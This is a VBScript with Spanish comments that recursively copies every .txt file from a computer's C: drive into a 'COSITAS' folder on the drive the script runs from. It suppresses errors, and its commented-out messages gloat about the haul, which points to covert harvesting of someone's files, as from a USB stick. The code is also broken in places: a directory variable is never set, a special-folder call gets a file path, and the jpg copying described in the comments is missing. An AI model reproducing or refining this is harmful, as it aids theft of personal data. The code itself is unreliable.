Option Explicit

Dim objShell, objFSO, errorOcurrido ' Declarar errorOcurrido en el alcance global
errorOcurrido = False

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

Dim fso, scriptDir, unidad
Set fso = CreateObject("Scripting.FileSystemObject")

' Obtener la unidad del disco
unidad = Left(scriptDir, 2)

Dim rutaAux
rutaAux = "file:\\\" & unidad & "\"

' Ruta de la carpeta "cositas" en el escritorio del usuario
Dim rutaDestino
rutaDestino = objShell.SpecialFolders(rutaAux) & "\COSITAS\"

' Crear la carpeta "cositas" si no existe
On Error Resume Next
If Not objFSO.FolderExists(rutaDestino) Then
    objFSO.CreateFolder(rutaDestino)
    If Err.Number <> 0 Then
        WScript.Echo "Error al crear la carpeta 'cositas' en el escritorio."
        errorOcurrido = True
    End If
End If
On Error GoTo 0

' Crear las carpetas "txt" y "jpg" dentro de "cositas" si no existen
CrearCarpetaSiNoExiste rutaDestino & "txt\"

' Copiar archivos .txt y .jpg del disco C y subcarpetas
CopyFilesByExtension "C:\", rutaDestino & "txt\", ".txt"

' Verificar si hubo errores durante la copia
'If errorOcurrido Then
'    WScript.Echo "Se han copiado casi todos xd"
'Else
'    WScript.Echo "Todo bien *frote de manos* XD"
'End If

WScript.Quit

Sub CopyFilesByExtension(rutaOrigen, rutaDestino, extension)
    Dim objFile, objSubFolder, rutaArchivoDestino ' Declarar las variables dentro de la función

    ' Recorrer todos los archivos en la carpeta
    On Error Resume Next
    For Each objFile In objFSO.GetFolder(rutaOrigen).Files
        ' Verificar la extensión del archivo
        If LCase(objFSO.GetExtensionName(objFile.Path)) = Mid(extension, 2) Then
            ' Construir la ruta de destino para copiar el archivo
            rutaArchivoDestino = rutaDestino & objFSO.GetBaseName(objFile.Name) & extension
            
            ' Copiar el archivo
            objFSO.CopyFile objFile.Path, rutaArchivoDestino, True ' True para sobreescribir si ya existe
            If Err.Number <> 0 Then
                ' Error al copiar, probablemente acceso denegado
                errorOcurrido = True
            End If
            Err.Clear
        End If
    Next

    ' Recorrer todas las subcarpetas
    For Each objSubFolder In objFSO.GetFolder(rutaOrigen).Subfolders
        CopyFilesByExtension objSubFolder.Path, rutaDestino, extension
    Next
End Sub

Sub CrearCarpetaSiNoExiste(rutaCarpeta)
    If Not objFSO.FolderExists(rutaCarpeta) Then
        objFSO.CreateFolder(rutaCarpeta)
        If Err.Number <> 0 Then
            WScript.Echo "Error al crear la carpeta '" & rutaCarpeta & "'."
            errorOcurrido = True
        End If
    End If
End Sub
